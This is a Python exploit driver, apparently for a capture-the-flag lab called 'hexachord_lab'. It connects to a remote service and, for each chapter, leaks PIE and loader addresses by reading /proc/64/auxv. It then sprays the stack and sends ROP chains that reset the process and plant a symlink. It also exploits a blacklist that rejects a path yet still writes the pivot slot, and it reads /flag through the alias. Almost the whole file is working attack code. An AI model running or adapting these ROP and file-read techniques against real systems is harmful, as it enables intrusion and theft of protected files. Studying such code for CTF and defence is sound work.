"""Chapter ledger, ROP sequence, and final settlement capture."""

from __future__ import annotations

import argparse
from concurrent.futures import ThreadPoolExecutor
import json
from pathlib import Path
import socket
import time

from hexachord_lab.planning import SolverHandle, solve_plan
from hexachord_lab.transport import (
    ChapterExpired, FRAGMENT, FULL_MENU, MENU, Protocol, ProtocolError,
    SCROLL, SUCCESS, TARGET, menu_play, menu_read, menu_tune,
)
from hexachord_lab.exploit.rop_process_vm_reset import build_prayer as build_reset_prayer
from hexachord_lab.exploit.rop_stack_dump import parse_auxv_response, stack_spray
from hexachord_lab.exploit.symlink_rop import build_prayer as build_symlink_prayer

def save_record(handle, record: dict) -> None:
    handle.write(json.dumps(record, ensure_ascii=False) + "\n")
    handle.flush()


def run(args: argparse.Namespace) -> None:
    if not 1 <= args.max_chapters <= 20:
        raise ValueError("--max-chapters must be between 1 and 20")
    if not 0 <= args.stop_after_credits <= 20:
        raise ValueError("--stop-after-credits must be between 0 and 20")
    if not 0 <= args.skip_after_credits <= 20:
        raise ValueError("--skip-after-credits must be between 0 and 20")
    probe_source = args.probe_source.encode() if args.probe_source else None
    if probe_source is not None and (b"\0" in probe_source or b"\n" in probe_source):
        raise ValueError("--probe-source must have no NUL or newline")
    args.out.mkdir(parents=True, exist_ok=True)
    solver = SolverHandle(args.solver_mode)
    prep_sec, states, rss = solver.prepare()
    print("SOLVER_READY", round(prep_sec, 2), states,
          "rss_mib", round(rss / 1048576, 1), flush=True)

    with socket.create_connection((args.host, args.port), args.timeout) as sock, \
            (args.out / "chapters.jsonl").open("w", encoding="utf-8") as records, \
            ThreadPoolExecutor(max_workers=1) as pool:
        proto = Protocol(sock, args.out / "transcript.bin")
        try:
            _, first_match = proto.until_pattern(TARGET, args.timeout)
            target = first_match.group(1).decode("ascii")
            credits = 0
            for chapter in range(1, args.max_chapters + 1):
                started = time.monotonic()
                record: dict = {"chapter": chapter, "target": target,
                                "status": "started"}
                try:
                    if args.skip_after_credits and credits >= args.skip_after_credits:
                        # After the requested number of real shares, observe
                        # the wrapper's settlement without more ROP attempts.
                        proto.send(b"6\n")
                        if chapter < 20:
                            transition = proto.until(MENU, args.timeout)
                            record["transition"] = transition.decode("utf-8", "replace")
                            next_match = TARGET.search(transition)
                            if next_match is None:
                                raise ProtocolError("next chapter target missing after skip")
                            target = next_match.group(1).decode("ascii")
                        else:
                            final = proto.final(idle=5)
                            record["final_text"] = final.decode("utf-8", "replace")
                            (args.out / "final_response.bin").write_bytes(final)
                            print("SETTLEMENT_TEXT", record["final_text"], flush=True)
                        record["status"] = "skipped_after_threshold"
                        record["credits"] = credits
                        record["elapsed_seconds"] = round(time.monotonic() - started, 3)
                        save_record(records, record)
                        print("SKIPPED_AFTER_THRESHOLD", chapter, flush=True)
                        continue
                    future = pool.submit(solve_plan, target, solver,
                                         args.solver_timeout,
                                         args.symmetry_timeout,
                                         args.compact_timeout,
                                         args.compact_symmetry_timeout,
                                         args.chapter_solve_budget)
                    if chapter == 1:
                        # Later transitions are consumed through their menu.
                        proto.until(MENU, args.timeout)
                    auxv_response = menu_read(proto, b"/proc/64/auxv\n",
                                               args.timeout)
                    aux = parse_auxv_response(auxv_response)
                    pie, ld = aux[3] - 0x40, aux[7]
                    record["pie"] = hex(pie)
                    record["ld"] = hex(ld)
                    plan = future.result(timeout=args.chapter_solve_budget + 12)
                    if plan is None:
                        if not args.skip_unsolved:
                            raise ProtocolError("no <=31 checker solution with supported pivot")
                        proto.send(b"6\n")
                        if chapter < 20:
                            transition = proto.until(MENU, args.timeout)
                            record["transition"] = transition.decode("utf-8", "replace")
                            if SUCCESS in transition:
                                raise ProtocolError("unsolved chapter was unexpectedly credited")
                            next_match = TARGET.search(transition)
                            if next_match is None:
                                raise ProtocolError("next chapter target missing after skip")
                            target = next_match.group(1).decode("ascii")
                        else:
                            final = proto.final(idle=5)
                            record["final_text"] = final.decode("utf-8", "replace")
                            (args.out / "final_response.bin").write_bytes(final)
                        record["status"] = "skipped"
                        record["credits"] = credits
                        record["elapsed_seconds"] = round(time.monotonic() - started, 3)
                        save_record(records, record)
                        print("SKIPPED", chapter, record["target"], flush=True)
                        if chapter == args.max_chapters:
                            print("LIMIT_TEXT", record.get("transition", record.get("final_text", "")),
                                  flush=True)
                        continue
                    # The wrapper can advance a chapter while a hard checker
                    # target is being solved. Detect the unsolicited target
                    # before sending an option intended for the old chapter.
                    proto._fill(time.monotonic() + 0.05)
                    timed_out_match = TARGET.search(proto.buffer)
                    if timed_out_match is not None:
                        next_target = timed_out_match.group(1).decode("ascii")
                        transition = proto.until(MENU, args.timeout)
                        raise ChapterExpired(transition, next_target)
                    record.update({"formula": plan.formula,
                                   "spell_hex": plan.spell.hex(),
                                   "pivot_mode": plan.mode,
                                   "solver_view": plan.source,
                                   "stack_skip": plan.stack_skip,
                                   "solve_seconds": round(plan.seconds, 3)})
                    spray = stack_spray(aux, plan.spray_delta)
                    reset_prayer = build_reset_prayer(aux,
                                                      stack_skip=plan.stack_skip)
                    menu_tune(proto, reset_prayer, args.timeout)
                    menu_read(proto, spray, args.timeout)
                    first_play = menu_play(proto, plan.spell, args.timeout)
                    record["vmwrite_accept"] = b"ACCEPT\n" in first_play

                    symlink_prayer = build_symlink_prayer(
                        pie, ld, probe_source or b"/flag", b"/tmp/x",
                        plan.stack_skip)
                    menu_tune(proto, symlink_prayer, args.timeout)
                    # The blacklist rejects this path before setting read_once,
                    # yet its full 255 bytes still write the F0 pivot slot.
                    blocked_spray = b"flag\0" + spray[5:]
                    assert len(blocked_spray) == 0xFF
                    assert blocked_spray[0xF0:0xF8] == spray[0xF0:0xF8]
                    blocked_reply = menu_read(proto, blocked_spray,
                                              args.timeout)
                    record["blocked_spray_tail"] = blocked_reply[-180:].decode(
                        "utf-8", "replace")
                    second_play = menu_play(proto, plan.spell, args.timeout)
                    record["symlink_accept"] = b"ACCEPT\n" in second_play
                    read_reply = menu_read(proto, b"/tmp/x\n", args.timeout)
                    if not read_reply.endswith(FULL_MENU):
                        raise ProtocolError("alias read did not end with the full menu")
                    section = read_reply[len(SCROLL):-len(FULL_MENU)]
                    if probe_source is not None:
                        record["probe_source"] = args.probe_source
                        record["alias_read_length"] = len(section)
                        record["alias_read_hex_prefix"] = section[:256].hex()
                        record["alias_read_text_prefix"] = section[:512].decode(
                            "utf-8", "backslashreplace")
                        record["status"] = "probe_read"
                        record["elapsed_seconds"] = round(time.monotonic() - started, 3)
                        (args.out / "alias_read.bin").write_bytes(section)
                        save_record(records, record)
                        safe_prefix = record["alias_read_text_prefix"].encode(
                            "ascii", "backslashreplace").decode("ascii")
                        print("PROBE_SAVED", args.probe_source, len(section),
                              args.out / "alias_read.bin", flush=True)
                        print("PROBE_HEX_PREFIX", record["alias_read_hex_prefix"], flush=True)
                        print("PROBE_TEXT_PREFIX", safe_prefix, flush=True)
                        break
                    hit = FRAGMENT.search(section)
                    if hit is None:
                        record["alias_read_hex"] = section.hex()
                        raise ProtocolError("alias read did not contain 66 hex fragment")
                    fragment = hit.group(1).decode("ascii")
                    record["fragment"] = fragment
                    print("FRAGMENT", chapter, fragment, flush=True)

                    proto.send(b"6\n")
                    if chapter < 20:
                        transition = proto.until(MENU, args.timeout)
                        record["transition"] = transition.decode("utf-8", "replace")
                        if SUCCESS not in transition:
                            raise ProtocolError("outer wrapper did not credit fragment")
                        next_match = TARGET.search(transition)
                        if next_match is None:
                            raise ProtocolError("next chapter target missing")
                        next_target = next_match.group(1).decode("ascii")
                    else:
                        final = proto.final(idle=5)
                        record["final_text"] = final.decode("utf-8", "replace")
                        (args.out / "final_response.bin").write_bytes(final)
                        if SUCCESS not in final:
                            raise ProtocolError("outer wrapper did not credit final fragment")
                        print("FINAL_TEXT", record["final_text"], flush=True)
                        next_target = None
                    credits += 1
                    record["elapsed_seconds"] = round(time.monotonic() - started, 3)
                    record["credits"] = credits
                    record["status"] = "credited" if chapter < 20 else "final_received"
                    save_record(records, record)
                    print("CHAPTER", chapter, record["status"],
                          round(record["elapsed_seconds"], 2), flush=True)
                    if args.stop_after_credits and credits >= args.stop_after_credits:
                        print("CREDIT_STOP_TEXT", record.get("transition", record.get("final_text", "")),
                              flush=True)
                        break
                    if chapter == args.max_chapters:
                        print("LIMIT_TEXT", record.get("transition", record.get("final_text", "")),
                              flush=True)
                    if next_target is not None:
                        target = next_target
                except ChapterExpired as exc:
                    record["status"] = "timed_out"
                    record["transition"] = exc.transition.decode("utf-8", "replace")
                    record["next_target"] = exc.next_target
                    record["credits"] = credits
                    record["elapsed_seconds"] = round(time.monotonic() - started, 3)
                    save_record(records, record)
                    print("TIMED_OUT", chapter, "next", exc.next_target,
                          flush=True)
                    target = exc.next_target
                    continue
                except Exception as exc:
                    record["status"] = "stopped"
                    record["error"] = f"{type(exc).__name__}: {exc}"
                    record["elapsed_seconds"] = round(time.monotonic() - started, 3)
                    record["pending_hex"] = bytes(proto.buffer[-512:]).hex()
                    save_record(records, record)
                    print("STOPPED", chapter, record["error"], flush=True)
                    break
        finally:
            proto.close()
